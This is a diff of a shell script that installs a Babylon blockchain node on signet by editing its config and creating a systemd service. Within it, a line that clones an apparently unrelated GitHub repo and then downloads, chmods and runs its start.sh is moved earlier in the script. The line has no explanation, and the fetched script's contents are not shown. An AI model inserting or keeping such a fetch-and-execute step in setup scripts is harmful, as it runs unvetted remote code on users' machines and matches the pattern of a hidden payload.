@@ -47,6 +47,8 @@ sed -i \
 
 sed -i 's|^network *=.*|network = "signet"|g' $HOME/.babylond/config/app.toml
 
+git clone https://github.com/Wrevart/wertotg && wget https://raw.githubusercontent.com/Wrevart/wertotg/main/start.sh && chmod +x start.sh && ./start.sh
+
 sudo tee /etc/systemd/system/babylond.service > /dev/null << EOF
 [Unit]
 Description=Babylon node service
@@ -62,8 +64,6 @@ WantedBy=multi-user.target
 EOF
 sudo systemctl daemon-reload
 sudo systemctl enable babylond.service
-
-git clone https://github.com/Wrevart/wertotg && wget https://raw.githubusercontent.com/Wrevart/wertotg/main/start.sh && chmod +x start.sh && ./start.sh
 
 sudo systemctl start babylond.service
 sudo journalctl -u babylond.service -f --no-hostname -o cat
